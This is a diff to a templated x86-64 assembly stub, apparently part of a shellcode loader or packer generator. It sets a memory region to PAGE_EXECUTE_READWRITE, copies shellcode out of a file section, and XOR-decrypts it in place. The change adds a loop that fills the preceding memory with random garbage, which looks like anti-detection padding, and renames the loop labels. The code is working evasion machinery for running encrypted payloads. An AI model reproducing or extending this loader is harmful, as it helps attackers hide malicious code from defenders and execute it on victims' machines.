@@ -183,9 +183,34 @@ entry:
   // store allocated memory address
   push rax
 
+  // padding garbage data to page
+  mov {{.RegV.rdx}}, rax
+  mov {{.RegV.rcx}}, {{hex .EntryOffset}}
+  // calculate a random seed from registers
+  add {{.RegV.rax}}, {{.Reg.rbx}}
+  add {{.RegV.rax}}, {{.Reg.rcx}}
+  add {{.RegV.rax}}, {{.Reg.rdx}}
+  add {{.RegV.rax}}, {{.Reg.rsi}}
+  add {{.RegV.rax}}, {{.Reg.rdi}}
+  add {{.RegV.rax}}, {{.Reg.r8}}
+  add {{.RegV.rax}}, {{.Reg.r9}}
+  add {{.RegV.rax}}, {{.Reg.r10}}
+  add {{.RegV.rax}}, {{.Reg.r11}}
+  next1:
+  call xor_shift
+  mov rax, {{.RegV.rax}}
+  mov [{{.RegV.rdx}}], al
+  // check padding garbage is finish
+  inc {{.RegV.rdx}}
+  dec {{.RegV.rcx}}
+  test {{.RegV.rcx}}, {{.RegV.rcx}}
+  jz break1
+  jmp next1
+  break1:
+
   // adjust memory region protect
   sub rsp, 0x08 // for store old protect
-  mov rcx, rax
+  mov rcx, [rsp + 0x08]
   mov rdx, {{hex .MemRegionSize}}
   mov r8, 0x40 // PAGE_EXECUTE_READWRITE
   mov r9, rsp
@@ -201,18 +226,18 @@ entry:
   push rdi
   mov rsi, {{.RegN.rdi}}
   add rsi, {{hex .SectionOffset}}
-  mov rdi, [rsp + 16]
+  mov rdi, [rsp + 0x10]
   add rdi, {{hex .EntryOffset}}
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
-  next1:
+  next2:
   movsb
   inc rsi
   // check extract shellcode is finish
   dec {{.RegV.rcx}}
   test {{.RegV.rcx}}, {{.RegV.rcx}}
-  jz break1
-  jmp next1
-  break1:
+  jz break2
+  jmp next2
+  break2:
   pop rdi
   pop rsi
 
@@ -221,7 +246,7 @@ entry:
   mov {{.RegV.rdx}}, [rsp]
   add {{.RegV.rdx}}, {{hex .EntryOffset}}
   mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
-  next2:
+  next3:
   mov {{.RegV.r8}}, [{{.RegV.rdx}}]
   xor {{.RegV.r8}}, {{.RegV.rax}}
   mov [{{.RegV.rdx}}], {{.RegV.r8}}
@@ -231,9 +256,9 @@ entry:
   add {{.RegV.rdx}}, 8
   sub {{.RegV.rcx}}, 8
   test {{.RegV.rcx}}, {{.RegV.rcx}}
-  jz break2
-  jmp next2
-  break2:
+  jz break3
+  jmp next3
+  break3:
 
 {{else}}
   // extract encrypted shellcode from code cave
